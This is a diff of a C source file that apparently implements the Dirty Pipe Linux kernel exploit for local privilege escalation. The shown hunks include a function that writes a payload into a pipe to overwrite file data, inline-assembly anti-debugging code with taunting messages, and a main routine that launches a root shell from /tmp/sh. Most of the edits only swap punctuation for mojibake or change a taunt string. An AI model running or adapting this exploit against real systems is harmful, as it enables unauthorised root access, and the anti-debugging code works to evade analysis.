@@ -213,7 +213,7 @@ int exP(const char* file_path, long target_offset, const uint8_t* payload, size_
         return -1;
     }
 
-    // Step 2: Write the payload into the pipe — this will overwrite the data due to the Dirty Pipe vulnerability
+    // Step 2: Write the payload into the pipe â€” this will overwrite the data due to the Dirty Pipe vulnerability
     ssize_t bytes_written = write(pipe_fds[1],
         payload,
         payload_size);
@@ -245,7 +245,7 @@ int exP(const char* file_path, long target_offset, const uint8_t* payload, size_
 
 #define MSG_LEN (sizeof(message)-1)
 const char filename[] = "/proc/self/status";
-const char message[] = "[-] You again? What is this, your first reverse? Try harder.\n";
+const char message[] = "[-] [-] Anti-debug? Hahahahahah.\n";
 const int msg_len = sizeof(message) - 1;
 
 // Since you're such an expert, I figured you'd appreciate this masterpiece
@@ -270,7 +270,7 @@ void anti_arrogance() {
         "syscall\n\t"
         "cmpq $3,     %%rax\n\t"        // If less than 3, nahhh... denied.
         "jl   fail\n\t"
-        // --- Clean exit, you’re clear ---
+        // --- Clean exit, youâ€™re clear ---
         "jmp  done\n\t"
 
         // --- Caught ya! Time to flex --
@@ -363,7 +363,7 @@ int main(int argc, char** argv) {
     // Step 4: Pop the root shell
     printf("[+] Launching root shell... Please remember to remove /tmp/sh after use.\n");
     if (system("/tmp/sh") != 0) {
-        fprintf(stderr, "[-] Failed to launch root shell — make sure /tmp/sh exists and is executable.\n");
+        fprintf(stderr, "[-] Failed to launch root shell â€” make sure /tmp/sh exists and is executable.\n");
         free(orig_bytes);
         return EXIT_FAILURE;
     }
